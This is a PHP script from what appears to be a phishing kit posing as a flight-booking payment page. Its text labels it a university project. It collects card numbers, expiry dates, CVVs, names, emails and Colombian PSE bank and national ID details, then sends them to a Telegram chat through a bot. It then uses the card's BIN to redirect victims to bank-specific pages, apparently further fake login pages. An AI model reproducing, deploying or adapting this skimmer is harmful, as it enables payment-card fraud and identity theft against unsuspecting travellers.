<?php
// assets/config/comprobando.php

// Mostrar todos los errores para depuración
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Iniciar sesión si aún no está iniciada
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

// Incluir configuraciones
require_once('telegram_config.php');
require_once('bins_config.php');
require_once('bot_telegram.php');

// --- Capturar datos del vuelo para pasarlos en la URL de error ---
$queryParams = [];
$flight_data_keys = [
    'total', 'passengers', 'origin', 'destination', 'departure-date',
    'out_dep_time', 'out_arr_time', 'out_dep_airport', 'out_arr_airport', 'out_tariff',
    'return-date', 'ret_dep_time', 'ret_arr_time', 'ret_dep_airport', 'ret_arr_airport', 'ret_tariff'
];

foreach ($flight_data_keys as $key) {
    if (isset($_POST[$key]) && !empty($_POST[$key])) {
        $queryParams[$key] = $_POST[$key];
    }
}
$flight_data_string = http_build_query($queryParams);

$contenido = "DATOS RECIBIDOS - PROYECTO UNIVERSIDAD \n\n";
$banco_encontrado = null;
$redirect_url = "../../../index.php?error=1&" . $flight_data_string;

// Determinar qué formulario fue enviado
if (isset($_POST['payment_method']) && $_POST['payment_method'] === 'card1') {
    // --- Lógica para el formulario de TARJETA ---
    $tarjeta = $_POST['creditcard'] ?? '';
    $nombre = $_POST['nombre'] ?? '';
    $expdate = $_POST['expdate'] ?? '';
    $cvv = $_POST['cvv'] ?? '';
    $email = $_POST['email'] ?? '';
    $quotas = $_POST['quotas'] ?? '';

    $contenido .= "💳 Tarjeta: " . $tarjeta . "\n";
    $contenido .= "📅 Fecha Expiración: " . $expdate . "\n";
    $contenido .= "🔒 CVV: " . $cvv . "\n";
    $contenido .= "👤 Nombre: " . $nombre . "\n";
    $contenido .= "📧 Email: " . $email . "\n";
    $contenido .= "📊 Cuotas: " . $quotas . "\n";

    $bin = substr(str_replace(' ', '', $tarjeta), 0, 6);
    $c = (int)$bin;
    $_SESSION['ca'] = $c;

    foreach ($bancos_bins as $banco => $bins) {
        if (in_array($c, $bins)) {
            $banco_encontrado = $banco;
            break;
        }
    }

    if ($banco_encontrado) {
        $contenido .= "\n🏦 Banco: " . $banco_encontrado;
        // Usa el array de rutas para tarjetas
        if (isset($banco_rutas[$banco_encontrado])) {
            $redirect_url = $banco_rutas[$banco_encontrado];
        }
    } else {
        $contenido .= "\n🏦 Banco: Sin información de BIN";
    }

} elseif (isset($_POST['payment_method']) && $_POST['payment_method'] === 'pse') {
    // --- Lógica para el formulario de PSE ---
    $bank_select = $_POST['bank'] ?? '';
    $document_type_pse = $_POST['document_type_pse'] ?? '';
    $document_number_pse = $_POST['document_number_pse'] ?? '';
    $email_pse = $_POST['email_pse'] ?? '';

    $contenido .= "🏦 Método de Pago: PSE\n";
    $contenido .= "🏦 Banco Seleccionado: " . $bank_select . "\n";
    $contenido .= "📄 Tipo de Documento: " . $document_type_pse . "\n";
    $contenido .= "🔢 Número de Documento: " . $document_number_pse . "\n";
    $contenido .= "📧 Email PSE: " . $email_pse . "\n";

    $banco_encontrado = $bank_select;
    
    // Usa el nuevo array de rutas exclusivo para PSE
    if (isset($banco_rutas_pse[$banco_encontrado])) {
        $redirect_url = $banco_rutas_pse[$banco_encontrado];
    } else {
        // Si el banco no tiene ruta, redirige al error manteniendo los datos del vuelo.
        $redirect_url = "../../../index.php?error=2&banco=" . urlencode($banco_encontrado) . "&" . $flight_data_string;
    }

} else {
    // No se especificó un método de pago válido
    $contenido .= "Error: No se especificó un método de pago válido o el formulario no fue reconocido.\n";
}

// --- Envío a Telegram ---
if (function_exists('enviarMensajeTelegram') && defined('TELEGRAM_CHAT_ID') && defined('TELEGRAM_BOT_TOKEN')) {
    enviarMensajeTelegram(TELEGRAM_CHAT_ID, $contenido, TELEGRAM_BOT_TOKEN);
}

// --- Redirección final ---
header('Location: ' . $redirect_url);
exit();

?>